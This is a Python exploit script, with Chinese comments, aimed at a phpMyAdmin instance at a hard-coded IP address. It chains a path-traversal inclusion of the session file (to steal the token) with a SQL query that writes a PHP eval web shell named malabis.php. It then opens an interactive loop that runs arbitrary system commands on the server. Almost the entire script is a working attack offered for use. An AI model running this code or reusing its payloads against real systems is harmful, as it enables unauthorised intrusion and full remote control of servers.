import requests
import re
sessionid = '4088c9dced97a547e2bffaa53d424748'#根据实际的sessionid修改-cookie里的phpmyadmin值
url1 = 'http://139.159.225.112:8016/import.php'
url2 = 'http://139.159.225.112:8016/?target=db_sql.php%253f/../../../../../../../../tmp/sess_'+sessionid
url3 = 'http://139.159.225.112:8016/malabis.php'#具体传入的PHP文件自己在shellcommand和url3中更改
shellcommand = '''SELECT "<?=file_put_contents('malabis.php','<?php eval(@$_POST[a]); ?>')?>";'''
pattern = 's:16:"(.+)";browser'
headers1 = {#请求url1的header头
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Cookie': 'phpMyAdmin='+sessionid+'; pma_lang=zh_CN'
}
headers2 = {#请求url2的header
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Cookie': 'phpMyAdmin='+sessionid+'; pma_lang=zh_CN',
    'Upgrade-Insecure-Requests': '1'
}
def reqget(url,header):
    r = requests.get(url,headers=header)#向指定url发包
    return r.text

def verify(url):#检验写入的一句话木马文件是否成功
    r = requests.get(url)
    return r.status_code

def reqpost(url,header,data):
    r = requests.post(url,headers=header,data=data)
    return r.text

def gettoken(pattern,text):#得到token值
    pattern = re.compile(pattern)
    token = pattern.findall(text)
    return token[0]
r1 = reqget(url2,headers2)#向url2发包
token = gettoken(pattern,r1)#得到token值
data = 'token='+token+'&sql_query='+shellcommand+'&ajax_request=true'#传入url1的data值
r2 = reqpost(url1,headers1,data)#写入一句话木马
if verify(url3)==200:
    print('Write Success')
    print("请输入您要执行的命令")
    while 1:
        cmd = str(input(':'))
        cmddata = {
                'a':'system("'+cmd+'");'
            }
        result = reqpost(url3,headers2,cmddata)
        print(result)

